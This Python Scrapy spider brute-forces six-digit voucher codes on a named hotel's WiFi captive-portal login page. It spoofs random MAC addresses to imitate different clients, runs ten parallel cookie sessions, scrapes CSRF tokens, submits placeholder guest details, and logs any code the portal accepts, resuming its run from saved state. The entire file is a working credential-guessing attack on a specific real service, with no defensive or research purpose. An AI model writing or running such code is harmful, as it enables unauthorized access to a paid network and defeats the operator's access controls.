import json
import logging
import os
import random

import scrapy
from scrapy import signals
from scrapy.extensions.spiderstate import SpiderState
from scrapy.utils.request import request_httprepr
from scrapy.utils.response import response_httprepr
from twisted.internet import task

from passwords import Passwords

log = logging.getLogger(__name__)


def _random_mac_address() -> str:
    population = "0123456789abcdef"
    parts = ("".join(random.choices(population=population, k=2)) for i in range(6))
    return ":".join(parts)


class JsonSpiderState(SpiderState):
    """Store and load spider state during a scraping job in json format with a configurable interval"""
    def __init__(self, interval=5.0, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.counter = 0
        self.interval = interval

    @classmethod
    def from_crawler(cls, crawler):
        interval = crawler.settings.getfloat('JSON_SPIDER_STATE_DUMP_INTERVAL')
        obj = super().from_crawler(crawler)
        obj.interval = interval
        crawler.signals.connect(obj.response_received, signal=signals.response_received)
        return obj

    def response_received(self, spider, request, response):
        self.task = task.LoopingCall(self.dump_state, spider)
        self.task.start(self.interval)

    def spider_closed(self, spider):
        self.dump_state(spider)

    def dump_state(self, spider):
        if self.jobdir:
            with open(self.statefn, 'w') as f:
                json.dump(spider.state, f, indent=4)

    def spider_opened(self, spider):
        if self.jobdir and os.path.exists(self.statefn):
            with open(self.statefn, 'r') as f:
                spider.state = json.load(f)
        else:
            spider.state = {}

    @property
    def statefn(self):
        return os.path.join(self.jobdir, 'spider.state.json')


class LoggingDownloaderMiddleware:

    def process_request(self, request, spider):
        log.debug("Request:\n" + request_httprepr(request).decode("utf-8"))
        return

    def process_response(self, request, response, spider):
        log.debug("Reponse:\n" + response_httprepr(response).decode("utf-8"))
        return response


class Spider(scrapy.Spider):
    name = "artinwifi_spider"

    custom_settings = {
        "LOG_LEVEL": "INFO",
        "COOKIES_DEBUG": True,
        "CONCURRENT_REQUESTS": 10,
        "LOGSTATS_INTERVAL": 10,
        "DEFAULT_REQUEST_HEADERS": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        },
        "DOWNLOADER_MIDDLEWARES": {
            "spider.LoggingDownloaderMiddleware": 0,
        },
        "JOBDIR": "resume",
        # disable deduplication, because at some point requests to https://loceanicahotel.artinwifi.com/login
        # get deduplicated, because cookies are not added
        "DUPEFILTER_CLASS": "scrapy.dupefilters.BaseDupeFilter",
        "REQUEST_FINGERPRINTER_IMPLEMENTATION": "2.7",
        "EXTENSIONS": {
            "scrapy.extensions.spiderstate.SpiderState": None,
            "spider.JsonSpiderState": 0,
        }
    }
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.params = dict(start="000000", end="999999", alphabet="0123456789")
        self.params.update(kwargs)

    def start_requests(self):
        if self.state:
            log.info(f"Continuing old session")
        else:
            self.state = self.params
            log.info(f"Starting new session")
        params_str = " ".join(f"{k}={v}" for k, v in self.state.items())
        log.info(f"Params: {params_str}")

        self.passwords = iter(Passwords(**self.state).generator())

        for i in range(self.settings["CONCURRENT_REQUESTS"]):
            mac_address = _random_mac_address()
            url = f"https://loceanicahotel.artinwifi.com/?ssid=loceanicahotel.artinwifi&id={mac_address}&" \
                  f"ip=172.16.8.242&username=&url=http://detectportal.firefox.com/canonical.html" \
                  f"&ap=loceanicahotel.artinwifi&link-login-only=http://loceanicahotel.artinwifi/login"
            meta = {"cookiejar": i}
            yield scrapy.Request(url=url, callback=self.parse, errback=self.errback, meta=meta, headers=meta)

    def parse(self, response, **kwargs):
        password = response.meta.get("password")
        # in case of parsing first login page, there is no password, and no "Password Not Valid" message
        if password:
            if "Password Not Valid!" not in response.text:
                yield dict(password=password)
            self.state["start"] = password

        csrf_token = response.css("input[name=csrf_token]::attr(value)").get()

        password = next(self.passwords)
        body = f"csrf_token={csrf_token}&redirect_override=&element_2962_namesurname_value=xxx+xxx&" \
               f"element_2963_email_value=xxx%40google.com&element_2964_voucher_value={password}&" \
               f"element_2965_checkbox_value=1&next="
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # pass cookiejar to next requests
        meta = {"cookiejar": response.meta["cookiejar"], "password": password}
        url = "https://loceanicahotel.artinwifi.com/login"
        yield scrapy.Request(url=url, method="POST", callback=self.parse, errback=self.errback,
                             body=body, headers=headers, meta=meta)

    def errback(self, failure):
        log.info(failure)
        log.info("Request:\n" + request_httprepr(failure.request).decode("utf-8"))
        log.info("Reponse:\n" + response_httprepr(failure.value.response).decode("utf-8"))

